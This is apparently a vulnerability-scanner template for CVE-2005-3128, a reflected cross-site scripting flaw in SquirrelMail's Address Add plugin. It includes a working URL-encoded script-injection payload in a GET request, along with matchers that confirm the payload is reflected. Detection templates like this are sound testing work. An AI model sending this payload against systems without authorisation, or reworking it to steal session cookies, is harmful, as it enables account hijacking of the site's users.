id: CVE-2005-3128

info:
  name: SquirrelMail Address Add 1.4.2 - Cross-Site Scripting
  author: dhiyaneshDk
  severity: medium
  description: SquirrelMail Address Add 1.4.2 plugin contains a cross-site scripting vulnerability. It fails to properly sanitize user-supplied input, thus allowing an attacker to execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
  remediation: |
    Apply the latest security patches and updates from the vendor to address this vulnerability.
  impact: |
    Attackers can execute arbitrary scripts in the victim's browser, leading to session hijacking or defacement.
  reference:
    - https://www.exploit-db.com/exploits/26305
    - https://nvd.nist.gov/vuln/detail/CVE-2005-3128
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2005-3128
    epss-score: 0.01733
    epss-percentile: 0.82068
    cwe-id: CWE-80
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2005,xss,squirrelmail,plugin,edb,vkev,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - "text/html"
# digest: 4a0a00473045022100e6ff5b606d3596fa9e00eb7dbb5811e644aafdca69b0bb4840b589470307004b022011f9b7e5d4845a3b148cad59bfc5639625eec8ada3b6d9658bc6a839a882a568:922c64590222798bb761d5b6d8e72950